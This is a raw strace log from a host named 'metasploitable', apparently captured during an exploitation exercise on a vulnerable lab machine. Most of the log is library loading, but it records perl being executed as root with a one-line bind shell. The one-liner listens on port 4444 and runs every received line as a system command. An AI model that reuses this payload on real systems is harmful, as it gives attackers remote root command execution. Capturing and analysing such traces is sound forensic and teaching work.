\4\2\20\10\0\0\204\260\200\0\340\23\0\212$\0\206\210\0\2`@q\0\0\0\0\0\0\0\0\0\0\0r\0\0\0\0\0\0\0t\0\0\0\0\0\0\0", 512) = 512
5968  07:11:35.390712 fstat64(1, {st_mode=S_IFREG|0644, st_size=83708, ...}) = 0
5968  07:11:35.390729 mmap2(NULL, 96232, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7dd5000
5968  07:11:35.390740 mmap2(0xb7de9000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x13) = 0xb7de9000
5968  07:11:35.390755 mmap2(0xb7deb000, 6120, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7deb000
5968  07:11:35.390768 close(1)          = 0
5968  07:11:35.390794 munmap(0xb7f7b000, 29913) = 0
5968  07:11:35.390811 open("/etc/ld.so.cache", O_RDONLY) = 1
5968  07:11:35.390824 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
5968  07:11:35.390839 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f7b000
5968  07:11:35.390849 close(1)          = 0
5968  07:11:35.390859 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5968  07:11:35.390874 open("/lib/tls/i686/cmov/libnss_nis.so.2", O_RDONLY) = 1
5968  07:11:35.390887 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20\31\0\0004\0\0\0\320\201\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\350x\0\0\350x\0\0\350x\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\310}\0\0\310}\0\0\5\0\0\0\0\20\0\0\1\0\0\0\334~\0\0\334\216\0\0\334\216\0\0\374\1\0\0`\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\360~\0\0\360\216\0\0\360\216\0\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\334~\0\0\334\216\0\0\334\216\0\0\30\1\0\0\30\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0g\0\0\0000\0\0\0\20\0\0\0\t\0\0\0\2\0\0H  \26\20\0\0@g\3\0\3\6\30\24\0248A\30&\243\301\200\212\0048\21\10 B@\310\24\344\20\311\244\10\0\4\0\0@\0P!\0\0\204\0\0\0\0@\v\0y\243\0D\202\0\0\0\0000\0\0\0001\0\0\0\0\0\0\0002\0\0\0003\0\0\0004\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0005\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0006\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0007\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
5968  07:11:35.391065 fstat64(1, {st_mode=S_IFREG|0644, st_size=34352, ...}) = 0
5968  07:11:35.391085 mmap2(NULL, 37436, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7dcb000
5968  07:11:35.391110 mmap2(0xb7dd3000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x7) = 0xb7dd3000
5968  07:11:35.391126 close(1)          = 0
5968  07:11:35.391139 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5968  07:11:35.391170 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 1
5968  07:11:35.391185 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30\0\0004\0\0\0\254\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\330\206\0\0\330\206\0\0\330\206\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\240\213\0\0\240\213\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0\314\1\0\0\260\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0k\0\0\0.\0\0\0\20\0\0\0\t\0\0\0\"F\340\24\240\240\245\1\31\10\200\20\203\6\212\10\0\0\222@]\1(\nx\10 \"\220\200\20,\5\1\204\4)!\0224\0\24\0\31\0\0\2\2\210@\0\200@0\210\201@@\200\0B\0\6\300.\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0002\0\0\0003\0\0\0\0\0\0\0004\0\0\0\0\0\0\0005\0\0\0007\0\0\0008\0\0\0\0\0\0\0:\0\0\0\0\0\0\0;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
5968  07:11:35.391275 fstat64(1, {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
5968  07:11:35.391292 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7dc0000
5968  07:11:35.391303 mmap2(0xb7dc9000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x8) = 0xb7dc9000
5968  07:11:35.391320 close(1)          = 0
5968  07:11:35.391341 munmap(0xb7f7b000, 29913) = 0
5968  07:11:35.391358 open("/etc/passwd", O_RDONLY|0x80000 /* O_??? */) = 1
5968  07:11:35.391373 fcntl64(1, F_GETFD) = 0x1 (flags FD_CLOEXEC)
5968  07:11:35.391385 _llseek(1, 0, [0], SEEK_CUR) = 0
5968  07:11:35.391397 fstat64(1, {st_mode=S_IFREG|0644, st_size=1624, ...}) = 0
5968  07:11:35.391414 mmap2(NULL, 1624, PROT_READ, MAP_SHARED, 1, 0) = 0xb7f82000
5968  07:11:35.391438 _llseek(1, 1624, [1624], SEEK_SET) = 0
5968  07:11:35.391483 munmap(0xb7f82000, 1624) = 0
5968  07:11:35.391493 close(1)          = 0
5968  07:11:35.391537 getpgrp()         = 3831
5968  07:11:35.391548 rt_sigaction(SIGCHLD, {0x807e540, [], 0}, {SIG_DFL}, 8) = 0
5968  07:11:35.391563 getrlimit(RLIMIT_NPROC, {rlim_cur=8191, rlim_max=8191}) = 0
5968  07:11:35.391579 brk(0x8101000)    = 0x8101000
5968  07:11:35.391611 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
5968  07:11:35.391626 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
5968  07:11:35.391641 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
5968  07:11:35.391678 brk(0x8102000)    = 0x8102000
5968  07:11:35.391705 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
5968  07:11:35.391724 stat64("/sbin/AB", 0xbfd63bb8) = -1 ENOENT (No such file or directory)
5968  07:11:35.391736 stat64("/bin/AB", 0xbfd63bb8) = -1 ENOENT (No such file or directory)
5968  07:11:35.391747 stat64("/usr/sbin/AB", 0xbfd63bb8) = -1 ENOENT (No such file or directory)
5968  07:11:35.391759 stat64("/usr/bin/AB", 0xbfd63bb8) = -1 ENOENT (No such file or directory)
5968  07:11:35.391773 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
5968  07:11:35.391788 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7df66f8) = 5969
5969  07:11:35.391835 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
5969  07:11:35.391851 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
5969  07:11:35.391864 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
5969  07:11:35.391876 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
5969  07:11:35.391891 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
5969  07:11:35.391907 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
5969  07:11:35.391933 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
5969  07:11:35.392034 write(2, "sh: AB: command not found\n", 26) = -1 EPIPE (Broken pipe)
5969  07:11:35.392049 --- SIGPIPE (Broken pipe) @ 0 (0) ---
5969  07:11:35.392132 exit_group(127)   = ?
5968  07:11:35.407559 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
4519  07:11:35.407578 waitpid(5968,  <unfinished ...>
5968  07:11:35.407588 <... rt_sigprocmask resumed> NULL, 8) = 0
5968  07:11:35.407595 --- SIGCHLD (Child exited) @ 0 (0) ---
5968  07:11:35.407607 waitpid(-1, [{WIFEXITED(s) && WEXITSTATUS(s) == 127}], WNOHANG) = 5969
5968  07:11:35.407623 waitpid(-1, 0xbfd63838, WNOHANG) = -1 ECHILD (No child processes)
5968  07:11:35.407633 sigreturn()       = ? (mask now [])
5968  07:11:35.407656 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
5968  07:11:35.407670 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
5968  07:11:35.407681 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
5968  07:11:35.407693 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_DFL}, 8) = 0
5968  07:11:35.407710 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
5968  07:11:35.407722 rt_sigaction(SIGINT, {SIG_DFL}, {0x807f150, [], 0}, 8) = 0
5968  07:11:35.407755 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
5968  07:11:35.407775 stat64("/sbin/perl", 0xbfd63be8) = -1 ENOENT (No such file or directory)
5968  07:11:35.407787 stat64("/bin/perl", 0xbfd63be8) = -1 ENOENT (No such file or directory)
5968  07:11:35.407798 stat64("/usr/sbin/perl", 0xbfd63be8) = -1 ENOENT (No such file or directory)
5968  07:11:35.407810 stat64("/usr/bin/perl", {st_mode=S_IFREG|0755, st_size=1080724, ...}) = 0
5968  07:11:35.407827 stat64("/usr/bin/perl", {st_mode=S_IFREG|0755, st_size=1080724, ...}) = 0
5968  07:11:35.407851 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
5968  07:11:35.407866 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7df66f8) = 5970
5970  07:11:35.407911 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
5970  07:11:35.407927 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
5970  07:11:35.407939 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
5970  07:11:35.407951 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
5970  07:11:35.408021 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
5970  07:11:35.408053 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
5970  07:11:35.408080 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
5970  07:11:35.408126 execve("/usr/bin/perl", ["perl", "-MIO", "-e", "$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};"], [/* 14 vars */]) = 0
5970  07:11:35.408212 brk(0)            = 0x8153000
5970  07:11:35.408231 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5970  07:11:35.408246 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f00000
5970  07:11:35.408262 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
5970  07:11:35.408278 open("/etc/ld.so.cache", O_RDONLY) = 1
5970  07:11:35.408291 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
5970  07:11:35.408307 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7ef8000
5970  07:11:35.408317 close(1)          = 0
5970  07:11:35.408328 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5970  07:11:35.408342 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 1
5970  07:11:35.408356 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\0004\0\0\0L!\0\0\0\0\0\0004\0 \0\10\0(\0\35\0\34\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0003\33\0\0003\33\0\0003\33\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\374\34\0\0\374\34\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264\36\0\0\264.\0\0\264.\0\0\230\1\0\0\310\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320\36\0\0\320.\0\0\320.\0\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\264\36\0\0\264.\0\0\264.\0\0@\1\0\0@\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\26\0\0\0\31\0\0\0\4\0\0\0\7\0\0\0\230\0\21\0\0B\0\0\202\0`\10\223(\10\336\31\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\32\0\0\0\0\0\0\0\33\0\0\0\34\0\0\0\0\0\0\0\36\0\0\0\0\0\0\0\0\0\0\0\37\0\0\0!\0\0\0\"\0\0\0\0\0\0\0\0\0\0\0#\0\0\0%\0\0\0&\0\0\0\0\0\0\0(\0\0\0\221!\374\370\225\263_\31\5\350\7\371\6\2\4\371\7\2\4\371\301S\200\30\256\304M\17a\242\222\6\325=l\366\327=l\366\370\31sB\353\26\251\30\373\31sB", 512) = 512
5970  07:11:35.408450 fstat64(1, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
5970  07:11:35.408482 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7ef4000
5970  07:11:35.408523 mmap2(0xb7ef6000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x1) = 0xb7ef6000
5970  07:11:35.408540 close(1)          = 0
5970  07:11:35.408565 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5970  07:11:35.408579 open("/lib/tls/i686/cmov/libm.so.6", O_RDONLY) = 1
5970  07:11:35.408593 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@4\0\0004\0\0\0PB\2\0\0\0\0\0004\0 \0\t\0(\0 \0\37\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0 \1\0\0 \1\0\0\5\0\0\0\4\0\0\0\3\0\0\0x\20\2\0x\20\2\0x\20\2\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0$/\2\0$/\2\0\5\0\0\0\0\20\0\0\1\0\0\0\334>\2\0\334>\2\0\334>\2\0`\1\0\0\244\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\360>\2\0\360>\2\0\360>\2\0\350\0\0\0\350\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0T\1\0\0T\1\0\0T\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0P\345td\214\20\2\0\214\20\2\0\214\20\2\0\34\4\0\0\34\4\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\334>\2\0\334>\2\0\334>\2\0\30\1\0\0\30\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\214\2\0\0\17\0\0\0@\0\0\0\v\0\0\0%\220 \305\t\204g\v\0\302\20 \4iER\202\20\200\240\0}\210\272\10\10I\0\0\0\0\0\33\4\201\0\0\0\232U\20A P \200\224\202\220\21@\3722\0\304a\24\0\10\6\306\220\232\f\207\300 \250\0  \202\0\230\201\4E\7\0054a\2\0\0\251C\30\310 \10\23\30\24M8\"\0\22\24\21@T\203\2E\1\1\1\244\fX\20\0\210\2\0 \0@\0$\214\5\10", 512) = 512
5970  07:11:35.408678 fstat64(1, {st_mode=S_IFREG|0644, st_size=149328, ...}) = 0
5970  07:11:35.408695 mmap2(NULL, 147584, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7ecf000
5970  07:11:35.408706 mmap2(0xb7ef2000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x23) = 0xb7ef2000
5970  07:11:35.408721 close(1)          = 0
5970  07:11:35.408732 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5970  07:11:35.408745 open("/lib/tls/i686/cmov/libpthread.so.0", O_RDONLY) = 1
5970  07:11:35.408759 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20H\0\0004\0\0\0\330C\1\0\0\0\0\0004\0 \0\t\0(\0$\0!\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0 \1\0\0 \1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\224\n\1\0\224\n\1\0\224\n\1\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\4;\1\0\4;\1\0\5\0\0\0\0\20\0\0\1\0\0\0\344=\1\0\344M\1\0\344M\1\0T\3\0\0\374#\0\0\6\0\0\0\0\20\0\0\2\0\0\0\324>\1\0\324N\1\0\324N\1\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0T\1\0\0T\1\0\0T\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0P\345td\250\n\1\0\250\n\1\0\250\n\1\0\314\4\0\0\314\4\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\344=\1\0\344M\1\0\344M\1\0\20\2\0\0\20\2\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\262\1\0\0L\0\0\0@\0\0\0\v\0\0\0\31!\2\221\1\n\20\"@H \331\3\0I4\200\0\0@\0 \200\200\21P`@@\22\213\0020D\0\0\20\0\0\2\0\1\r\0\204\n\360\1X\260\r\240\200\10 $\204\20B\242)m\10G\234V\20\0\224 \204$\10\0H(\1\222\34\301B\240\220\22\10\f \2\30`A\244c\4\0\n\32\3\0\0)\0(\314@\204\210L\22\10\241\0\4\0\10\0\300Q\0\2009\4C\300", 512) = 512
5970  07:11:35.408843 fstat64(1, {st_mode=S_IFREG|0755, st_size=112354, ...}) = 0
5970  07:11:35.408860 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7ece000
5970  07:11:35.408872 mmap2(NULL, 94688, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7eb6000
5970  07:11:35.408883 mmap2(0xb7eca000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x13) = 0xb7eca000
5970  07:11:35.408900 mmap2(0xb7ecc000, 4576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7ecc000
5970  07:11:35.408915 close(1)          = 0
5970  07:11:35.408926 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5970  07:11:35.408939 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 1
5970  07:11:35.408952 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1\0004\0\0\0\4\307\24\0\0\0\0\0004\0 \0\n\0(\0D\0C\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\2200\23\0\2200\23\0\2200\23\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(\215\24\0(\215\24\0\5\0\0\0\0\20\0\0\1\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\260\'\0\0\204T\0\0\6\0\0\0\0\20\0\0\2\0\0\0\234\255\24\0\234\255\24\0\234\255\24\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\10\0\0\0,\0\0\0\4\0\0\0\4\0\0\0P\345td\2440\23\0\2440\23\0\2440\23\0\354+\0\0\354+\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\354\221\24\0\354\221\24\0\354\221\24\0\10\36\0\0\10\36\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\363\3\0\0\n\0\0\0\0\2\0\0\16\0\0\0\2400\20D\200 \2\1\214\3\346\220AE\210\0\204\0\10\0A\200\0@\300\200\0\f\2\f\0\0010\0\10@\"\10\246\4\210H6l\240\0260\0&\204\200\216\4\10B$\2\f\246\244\32\6c\310\0\302 \1\300\0R\0!\201\10\4\n  \250\24\0\24(`\0\0P\240\312DB", 512) = 512
5970  07:11:35.409100 fstat64(1, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
5970  07:11:35.409131 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d67000
5970  07:11:35.409142 mmap2(0xb7eb0000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x149) = 0xb7eb0000
5970  07:11:35.409157 mmap2(0xb7eb3000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7eb3000
5970  07:11:35.409170 close(1)          = 0
5970  07:11:35.409182 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5970  07:11:35.409195 open("/lib/tls/i686/cmov/libcrypt.so.1", O_RDONLY) = 1
5970  07:11:35.409209 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\7\0\0004\0\0\0<\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\340\210\0\0\340\210\0\0\340\210\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\f\212\0\0\f\212\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0`\1\0\0tr\2\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\17\0\0\0\22\0\0\0\2\0\0\0\6\0\0\0\4\311\240, \4\0\0\0\0\0\0\0\0\0\0\0\0\0\0\22\0\0\0\23\0\0\0\24\0\0\0\0\0\0\0\25\0\0\0\26\0\0\0\0\0\0\0\27\0\0\0\0\0\0\0\30\0\0\0\31\0\0\0\0\0\0\0k\31Qj\233(\375B\233`\205\33\327\16?\17I->\333\235C\r\375\313\373_\22\325=l\366\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0o\0\0\0\0\0\0\0\35\0\0\0\22\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0 \0\0\0\37\0\0\0\0\0\0\0", 512) = 512
5970  07:11:35.409296 fstat64(1, {st_mode=S_IFREG|0644, st_size=38300, ...}) = 0
5970  07:11:35.409313 mmap2(NULL, 201052, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d35000
5970  07:11:35.409323 mmap2(0xb7d3e000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x8) = 0xb7d3e000
5970  07:11:35.409337 mmap2(0xb7d40000, 155996, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7d40000
5970  07:11:35.409350 close(1)          = 0
5970  07:11:35.409373 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d34000
5970  07:11:35.409386 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7d348c0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
5970  07:11:35.409447 mprotect(0xb7eb0000, 4096, PROT_READ) = 0
5970  07:11:35.409526 munmap(0xb7ef8000, 29913) = 0
5970  07:11:35.409543 set_tid_address(0xb7d34908) = 5970
5970  07:11:35.409586 set_robust_list(0xb7d34910, 0xc) = 0
5970  07:11:35.409614 futex(0xbf8ec580, 0x81 /* FUTEX_??? */, 1) = 0
5970  07:11:35.409647 rt_sigaction(SIGRTMIN, {0xb7eba2c0, [], SA_SIGINFO}, NULL, 8) = 0
5970  07:11:35.409680 rt_sigaction(SIGRT_1, {0xb7eba340, [], SA_RESTART|SA_SIGINFO}, NULL, 8) = 0
5970  07:11:35.409728 rt_sigprocmask(SIG_UNBLOCK, [RTMIN RT_1], NULL, 8) = 0
5970  07:11:35.409756 getrlimit(RLIMIT_STACK, {rlim_cur=8192*1024, rlim_max=RLIM_INFINITY}) = 0
5970  07:11:35.409809 uname({sys="Linux", node="metasploitable", ...}) = 0
5970  07:11:35.409928 rt_sigaction(SIGFPE, {SIG_IGN}, {SIG_DFL}, 8) = 0
5970  07:11:35.410110 brk(0)            = 0x8153000
5970  07:11:35.410121 brk(0x8174000)    = 0x8174000
5970  07:11:35.410243 getuid32()        = 0
5970  07:11:35.410267 geteuid32()       = 0
5970  07:11:35.410276 getgid32()        = 0
5970  07:11:35.410284 getegid32()       = 0
5970  07:11:35.410358 mmap2(NULL, 135168, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d13000
5970  07:11:35.410435 open("/dev/urandom", O_RDONLY|O_LARGEFILE) = 1
5970  07:11:35.410537 read(1, "=\2Er", 4) = 4
5970  07:11:35.410551 close(1)          = 0
5970  07:11:35.410569 time(NULL)        = 1495624295
